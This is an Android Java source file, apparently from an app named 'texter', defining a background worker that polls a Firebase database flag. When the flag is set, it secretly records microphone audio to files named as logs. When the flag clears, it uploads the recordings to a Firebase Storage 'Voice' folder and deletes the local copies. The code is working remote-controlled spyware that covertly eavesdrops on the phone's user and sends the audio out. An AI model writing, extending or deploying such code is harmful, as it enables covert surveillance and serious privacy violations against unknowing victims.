package com.app.texter;

import static android.content.ContentValues.TAG;

import android.content.Context;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.work.ListenableWorker;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.concurrent.TimeUnit;

public class workalways extends Worker {
    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    private boolean recstart=false;
    MediaRecorder recorder;
    boolean shouldStart=false;
    FirebaseStorage storage;
    StorageReference storageReference;
    File filePath;


    public workalways(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }



    @NonNull
    @Override
    public ListenableWorker.Result doWork() {

        firebaseDatabase = FirebaseDatabase.getInstance();
        databaseReference = firebaseDatabase.getReference("User");

        databaseReference.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                ArrayList<String > data=new ArrayList<>();
                for (DataSnapshot snap:snapshot.getChildren()){
                    data.add(snap.getValue().toString());
                }
                if (data.get(4).equals("1")){ shouldStart=true; }
                else{shouldStart=false;}

                if (shouldStart){
                    String file_name=getfilename();
                    if (!recstart){startRecording("",file_name);} }
                else{
                    if (recstart){stopRecording();
                        File path = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/Logandroidfiles");
                        if (!path.exists()){path.mkdirs();}
                        try {
                            ArrayList<String> filesinDict = dictFiles(path);
                            if (isInternet(getApplicationContext())) {

                                Toast.makeText(getApplicationContext(), "Internet Connected", Toast.LENGTH_SHORT).show();
                                uploadFile(getApplicationContext(),filesinDict,path);
                            }
                        }
                        catch (NullPointerException er){ Toast.makeText(getApplicationContext(), er.getMessage(), Toast.LENGTH_SHORT).show(); } catch (Exception exc){ Toast.makeText(getApplicationContext(), exc.getMessage(), Toast.LENGTH_SHORT).show(); }
                    }

                }
            }


            @Override


            public void onCancelled(@NonNull DatabaseError error) {
                Toast.makeText(getApplicationContext(), "Storage Error", Toast.LENGTH_SHORT).show();

            }
        });




        return Result.success();
    }


    public String getfilename(){
        File path = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/Logandroidfiles");
        if (!path.exists()){path.mkdirs();}
        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        Date date = new Date();
        String currentdate=(String) dateFormat.format(date);
        String[] datee=currentdate.split(" ");
        String day=datee[0].replace("/","_");
        String time = datee[1].replace(":","_");

        String filename=path+"/"+"_"+day+"_"+time+"_log.3gp";
        return filename;

    }

    public void startRecording( String number,String filename) {
        recorder = new MediaRecorder();
        //recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(filename);

        try {
            recorder.prepare();
            recorder.start();
            recstart = true;
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void stopRecording() {
        if (recstart) {
            recorder.stop();
            recorder.release();
            recstart = false;
        }
    }

    public boolean isInternet(Context context){
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo nf = cm.getActiveNetworkInfo();
            return (nf != null && nf.isConnected());
        }
        catch (NullPointerException e){
            e.printStackTrace();
            return false;
        }


    }

    public ArrayList<String> dictFiles(File path){
        ArrayList<String> filesname=new ArrayList<>();

        File directory = new File(String.valueOf(path));
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length; i++)
        {
            filesname.add(files[i].getName());
            Log.d("Files", "This is FileName:" + files[i].getName());
        }

        return filesname;
    }

    public void uploadFile(Context context, ArrayList<String> uploadfile,File path){
        storage = FirebaseStorage.getInstance();
        storageReference = storage.getReference();






        for (int i=0; i<uploadfile.size(); i++) {






            String filename=uploadfile.get(i);
            filePath=new File( path+"/"+filename);

            StorageReference ref = storageReference.child("Voice/").child(filename);

            ref.putFile(Uri.fromFile(filePath))


                    .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {

                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            Log.d(TAG, filePath.toString());
                            Toast.makeText(context, "Uploaded!!", Toast.LENGTH_SHORT).show();
                            File file = new File(path, filename);
                            boolean deleted = file.delete();
                        }
                    })

                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            //When error is thrown!
                            Toast.makeText(context, "Failed " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
        }


    }

}
